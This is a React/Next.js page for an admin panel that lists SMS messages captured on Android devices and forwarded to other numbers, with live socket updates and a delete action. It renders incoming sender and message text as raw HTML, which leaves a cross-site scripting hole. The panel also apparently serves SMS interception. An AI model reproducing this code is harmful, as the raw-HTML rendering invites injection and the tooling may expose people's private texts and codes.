"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import toast from "react-hot-toast";
import { Loader2, Trash2, Send } from "lucide-react";
import useUser from "@/components/useUser";
import { currentTime, getSocket, timeAgo } from "@/Helper";

export default function Page() {
  const [smsList, setSmsList] = useState([]);
  const [page, setPage] = useState(1);
  const [totalPages, setTotalPages] = useState(1);
  const [loading, setLoading] = useState(false);
  const authuser = useUser();

  const router = useRouter();  

  // Initialize Socket.IO
    useEffect(() => {
      if (!authuser) return;
      const socket = getSocket(authuser);
      socket.on("connect", () => {
        //console.log("✅ Connected to socket:", socket.id);
      });
      socket.on("new_sms_data", (data) => {
        if(data.success){
          toast.success(data.message); 
        }else {
          toast.error(data.message);
        }
        fetchSms(page);
      });
      // socket.on("disconnect", () => console.log("❌ Disconnected"));
      return () => {
        socket.off("new_sms_data");
      };
  }, [authuser]);

  const fetchSms = async (page) => {
    setLoading(true);
    try {
      const res = await fetch(`/api/sms-forwarding?page=${page}&limit=9`);
      const json = await res.json();
      setSmsList(json.data);
      setTotalPages(json?.pagination?.totalPages);
    } catch (err) {
      console.error("Error fetching SMS entries:", err);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchSms(page);
  }, [page]);

  const handleDelete = async (id) => {
    let confirm = window.confirm("Are you sure you want to delete this entry?");
    if (!confirm) return;
    let password = null;
    if(authuser.role !== "admin") {
      password = prompt("Enter admin password to delete this entry:");
      if (!password) return;
    }

    try {
      const res = await fetch(`/api/sms-forwarding/${id}`, {
        method: "DELETE",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      });
      const json = await res.json();

      if (res.ok) {
        setSmsList((prev) => prev.filter((d) => d.id !== id));
        toast.success(json.message || "SMS deleted successfully");
      } else {
        toast.error(json.error || "Failed to delete SMS entry");
      }
    } catch (err) {
      console.error("Error deleting:", err);
      toast.error(err.message || "Failed to delete SMS entry");
    }
  };

  const formatIST = (timestamp) => {
    if (!timestamp) return "-";
    const date = new Date(timestamp);
    return date.toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
  };

  return (
    <main className="flex-1 p-6 bg-gray-100 min-h-screen">
      <header className="flex justify-between items-center">
        <h2 className="text-3xl font-bold mb-6 text-gray-800">SMS Forwarding</h2>
        <button
          onClick={() => fetchSms(page)}
          className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded-xl shadow hover:bg-blue-700 transition-all"
        >
          <Send className="w-4 h-4" />
          Refresh
        </button>
      </header>

      {loading ? (
        <div className="flex justify-center items-center h-64">
          <Loader2 className="animate-spin text-blue-600 w-8 h-8" />
        </div>
      ) : smsList.length === 0 ? (
        <p className="text-center text-gray-600 text-lg mt-12">
          No SMS records found.
        </p>
      ) : (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6">
  {smsList.map((sms) => (
    <div
      key={sms.id}
      className="bg-white rounded-2xl shadow-sm hover:shadow-2xl transition-all duration-300 border border-gray-100 hover:border-gray-200 p-6 flex flex-col justify-between group"
    >
      {/* Header */}
      <div>
        <div className="flex items-start justify-between mb-4">
          <h2 className="font-semibold text-gray-900 text-lg tracking-tight">
            SMS #{sms.id}
          </h2>
          <span
            className={`flex items-center gap-1 px-2.5 py-0.5 rounded-full text-xs font-medium capitalize ${
              sms.sms_forwarding_status === "sending"
                ? "bg-yellow-100 text-yellow-800"
                : sms.sms_forwarding_status === "sent"
                ? "bg-green-100 text-green-800"
                : "bg-red-100 text-red-800"
            }`}
          >
            {sms.sms_forwarding_status === "sent" && "✅"}
            {sms.sms_forwarding_status === "sending" && "⏳"}
            {sms.sms_forwarding_status === "failed" && "⚠️"}
            {sms.sms_forwarding_status}
          </span>
          
        </div>
        <p className="text-gray-500 text-xs mt-2">
            🕒 {currentTime(sms.created_at)} By {sms.form_code}, {sms.android_id}
        </p>

        {/* Details */}
        <div className="space-y-2 text-sm text-gray-700" title={sms.android_id}>
          <div
            className="leading-snug"
            dangerouslySetInnerHTML={{
              __html: `<span class='font-medium text-gray-800'>Sender:</span> ${sms.sender}`,
            }}
          ></div>
          <p className="mt-0">
  <span className="font-medium text-blue-800">Receiver:</span>{" "}
  {sms.sim_sub_id === sms.sim1_sub_id
    ? sms.sim1_phone_no
    : sms.sim_sub_id === sms.sim2_sub_id
    ? sms.sim2_phone_no
    : "N/A"}
</p>

          <p>
            <span className="font-medium text-gray-800">Message:</span>{" "}
            <span
              className="italic text-gray-700"
              dangerouslySetInnerHTML={{
                __html: `${sms.message}`,
              }}
            ></span>
          </p>

          <p>
            <span className="font-medium text-red-800">Forward To:</span>{" "}
            {sms.forward_to_number}
          </p>
        

          <p className="text-sm text-red-600 ">
            <span className="font-medium text-yellow-800">
              StatusMessage:
            </span>{" "}
            {sms.sms_forwarding_status_message || "-"}
          </p>

          
        </div>
      </div>

      {/* Footer Actions */}
      <div className="mt-4 flex items-center justify-between space-x-2">
          {
            sms.device_id && (
              <button
            onClick={() => router.push(`/admin/devices/${sms.device_id}`)}
            className="hidden flex-1 px-4 py-2 bg-blue-600 text-white rounded-xl hover:bg-blue-700 transition"
          >
            View Device
          </button>
            )
          }
          <button
            onClick={() => handleDelete(sms.id)}
            className="flex-1 px-4 py-2 bg-red-600 text-white rounded-xl hover:bg-red-700 transition"
          >
            Delete
          </button>
        </div>
    </div>
  ))}
</div>

      )}

      {/* Pagination */}
      {totalPages > 1 && (
        <div className="flex justify-center items-center mt-10 gap-3">
          <button
            className="px-4 py-2 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 disabled:opacity-50"
            onClick={() => setPage((p) => Math.max(p - 1, 1))}
            disabled={page === 1}
          >
            Prev
          </button>
          <span className="px-4 py-2 bg-white border border-gray-200 rounded-lg shadow text-gray-700 font-medium">
            Page {page} of {totalPages}
          </span>
          <button
            className="px-4 py-2 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 disabled:opacity-50"
            onClick={() => setPage((p) => Math.min(p + 1, totalPages))}
            disabled={page === totalPages}
          >
            Next
          </button>
        </div>
      )}
    </main>
  );
}
